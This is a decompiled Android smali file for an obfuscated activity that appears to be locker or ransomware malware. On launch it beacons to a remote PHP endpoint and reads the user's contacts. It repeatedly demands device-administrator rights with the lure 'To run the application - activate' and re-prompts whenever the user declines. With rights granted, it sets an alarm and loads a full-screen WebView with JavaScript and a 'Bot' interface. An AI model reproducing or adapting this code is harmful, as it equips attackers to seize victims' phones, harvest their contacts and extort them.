.class public Lmzmr/iiyma/ssrxp/Rarecgbuq;
.super Landroid/app/Activity;
.source "Rarecgbuq.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lmzmr/iiyma/ssrxp/Rarecgbuq$Gdnwcpo;,
        Lmzmr/iiyma/ssrxp/Rarecgbuq$Dlxggodx;
    }
.end annotation


# static fields
.field static final ACTIVATION_REQUEST:I = 0x2f

.field static final TAG:Ljava/lang/String; = "DevicePolicyDemoActivity"


# instance fields
.field private alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;

.field private camera:I

.field private demoDeviceAdmin:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private face:I

.field private pict:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 63
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected colotit()V
    .locals 13

    .prologue
    const/4 v12, 0x2

    const/4 v11, 0x1

    const/4 v10, 0x0

    .line 137
    new-instance v6, Lmzmr/iiyma/ssrxp/Acadpcd;

    invoke-direct {v6, p0}, Lmzmr/iiyma/ssrxp/Acadpcd;-><init>(Landroid/content/Context;)V

    new-array v7, v11, [Ljava/lang/String;

    const-string v8, "davai"

    aput-object v8, v7, v10

    invoke-virtual {v6, v7}, Lmzmr/iiyma/ssrxp/Acadpcd;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 138
    new-instance v6, Lmzmr/iiyma/ssrxp/Ggnzszron;

    invoke-direct {v6}, Lmzmr/iiyma/ssrxp/Ggnzszron;-><init>()V

    iput-object v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;

    .line 139
    iget-object v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;

    invoke-virtual {v6, p0}, Lmzmr/iiyma/ssrxp/Ggnzszron;->SetAlarm(Landroid/content/Context;)V

    .line 141
    const-string v6, "cocon"

    invoke-virtual {p0, v6, v10}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 143
    .local v2, "settings":Landroid/content/SharedPreferences;
    const-string v6, "status"

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 145
    .local v4, "status":I
    const/16 v6, 0x4d

    if-ne v4, v6, :cond_0

    .line 146
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v6

    invoke-static {v6}, Landroid/os/Process;->killProcess(I)V

    .line 190
    :goto_0
    return-void

    .line 149
    :cond_0
    const-string v6, "camera"

    invoke-interface {v2, v6, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v6

    iput v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->camera:I

    .line 150
    iget v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->camera:I

    if-ne v6, v11, :cond_1

    .line 151
    const-string v6, "face"

    const-string v7, "facenull"

    invoke-interface {v2, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->pict:Ljava/lang/String;

    .line 152
    iget-object v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->pict:Ljava/lang/String;

    const-string v7, "facenull"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_3

    .line 153
    iput v11, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->face:I

    .line 158
    :cond_1
    :goto_1
    iget v6, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->camera:I

    if-ne v6, v12, :cond_2

    .line 160
    iput v11, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->face:I

    .line 167
    :cond_2
    const-string v6, "cocon"

    invoke-virtual {p0, v6, v10}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 168
    .local v3, "settings3":Landroid/content/SharedPreferences;
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 169
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v6, "start"

    invoke-interface {v0, v6, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 170
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const-wide/16 v8, 0x3e8

    div-long/2addr v6, v8

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 171
    .local v5, "tsLong":Ljava/lang/Long;
    const-string v6, "starttime"

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-interface {v0, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 172
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 173
    const/high16 v6, 0x7f030000

    invoke-virtual {p0, v6}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->setContentView(I)V

    .line 174
    const/high16 v6, 0x7f070000

    invoke-virtual {p0, v6}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    .line 176
    .local v1, "myWebView":Landroid/webkit/WebView;
    new-instance v6, Lmzmr/iiyma/ssrxp/Rarecgbuq$Gdnwcpo;

    const/4 v7, 0x0

    invoke-direct {v6, p0, v7}, Lmzmr/iiyma/ssrxp/Rarecgbuq$Gdnwcpo;-><init>(Lmzmr/iiyma/ssrxp/Rarecgbuq;Lmzmr/iiyma/ssrxp/Rarecgbuq$Gdnwcpo;)V

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 177
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 178
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 179
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSaveFormData(Z)V

    .line 180
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    .line 181
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v10}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 182
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v11}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 183
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    sget-object v7, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v6, v7}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 184
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    invoke-virtual {v6, v12}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 185
    new-instance v6, Lmzmr/iiyma/ssrxp/Rarecgbuq$Dlxggodx;

    invoke-direct {v6, p0, p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq$Dlxggodx;-><init>(Lmzmr/iiyma/ssrxp/Rarecgbuq;Landroid/content/Context;)V

    const-string v7, "Bot"

    invoke-virtual {v1, v6, v7}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 186
    const-string v6, "file:///android_asset/video.html"

    invoke-virtual {v1, v6}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 155
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v1    # "myWebView":Landroid/webkit/WebView;
    .end local v3    # "settings3":Landroid/content/SharedPreferences;
    .end local v5    # "tsLong":Ljava/lang/Long;
    :cond_3
    iput v12, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->face:I

    goto/16 :goto_1
.end method

.method protected ebat()V
    .locals 3

    .prologue
    .line 207
    new-instance v0, Landroid/content/Intent;

    .line 208
    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    .line 207
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 209
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.DEVICE_ADMIN"

    .line 210
    iget-object v2, p0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 209
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 211
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    .line 212
    const-string v2, "To run the application - activate"

    .line 211
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 213
    const/16 v1, 0x2f

    invoke-virtual {p0, v0, v1}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->startActivityForResult(Landroid/content/Intent;I)V

    .line 214
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 217
    packed-switch p1, :pswitch_data_0

    .line 229
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 230
    :goto_0
    return-void

    .line 219
    :pswitch_0
    const/4 v0, -0x1

    if-ne p2, v0, :cond_0

    .line 220
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enabled!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 221
    invoke-virtual {p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->colotit()V

    goto :goto_0

    .line 224
    :cond_0
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enable FAILED!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 225
    invoke-virtual {p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->ebat()V

    goto :goto_0

    .line 217
    :pswitch_data_0
    .packed-switch 0x2f
        :pswitch_0
    .end packed-switch
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 20
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 80
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 84
    const-string v1, "cocon"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    .line 86
    .local v15, "settings":Landroid/content/SharedPreferences;
    const-string v1, "status"

    const/4 v2, 0x0

    invoke-interface {v15, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v17

    .line 87
    .local v17, "status":I
    const/16 v1, 0x4d

    move/from16 v0, v17

    if-ne v0, v1, :cond_0

    .line 88
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v1

    invoke-static {v1}, Landroid/os/Process;->killProcess(I)V

    .line 92
    :cond_0
    const-string v19, "start"

    .line 93
    .local v19, "type":Ljava/lang/String;
    const-string v11, ""

    .line 94
    .local v11, "data":Ljava/lang/String;
    new-instance v1, Lmzmr/iiyma/ssrxp/Pvyoevmw;

    move-object/from16 v0, p0

    invoke-direct {v1, v0}, Lmzmr/iiyma/ssrxp/Pvyoevmw;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "http://servicemanapi.com/api/app.php"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object v19, v2, v3

    const/4 v3, 0x2

    aput-object v11, v2, v3

    invoke-virtual {v1, v2}, Lmzmr/iiyma/ssrxp/Pvyoevmw;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 96
    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object/from16 v1, p0

    invoke-virtual/range {v1 .. v6}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 97
    .local v10, "cursor":Landroid/database/Cursor;
    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v9

    .line 98
    .local v9, "countphones":I
    const/16 v18, 0x0

    .line 99
    .local v18, "t":I
    invoke-virtual/range {p0 .. p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 100
    .local v14, "phones":Landroid/database/Cursor;
    const-string v13, ""

    .line 101
    .local v13, "out":Ljava/lang/String;
    :cond_1
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_2

    .line 116
    :goto_0
    const-string v1, "cocon"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v16

    .line 117
    .local v16, "settings3":Landroid/content/SharedPreferences;
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 118
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "countphones"

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 119
    const-string v1, "listphones"

    invoke-interface {v12, v1, v13}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 120
    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 122
    const-string v1, "device_policy"

    move-object/from16 v0, p0

    invoke-virtual {v0, v1}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iput-object v1, v0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 123
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lmzmr/iiyma/ssrxp/Vhrxxje;

    move-object/from16 v0, p0

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    iput-object v1, v0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 124
    move-object/from16 v0, p0

    iget-object v1, v0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmzmr/iiyma/ssrxp/Rarecgbuq;->demoDeviceAdmin:Landroid/content/ComponentName;

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 125
    invoke-virtual/range {p0 .. p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->colotit()V

    .line 134
    :goto_1
    return-void

    .line 103
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_2
    const-string v1, "display_name"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 104
    .local v7, "Name":Ljava/lang/String;
    const-string v1, "data1"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 105
    .local v8, "Number":Ljava/lang/String;
    add-int/lit8 v18, v18, 0x1

    .line 106
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " <br />"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 107
    const/4 v1, 0x5

    move/from16 v0, v18

    if-le v0, v1, :cond_1

    goto/16 :goto_0

    .line 127
    .end local v7    # "Name":Ljava/lang/String;
    .end local v8    # "Number":Ljava/lang/String;
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v16    # "settings3":Landroid/content/SharedPreferences;
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lmzmr/iiyma/ssrxp/Rarecgbuq;->ebat()V

    goto :goto_1
.end method
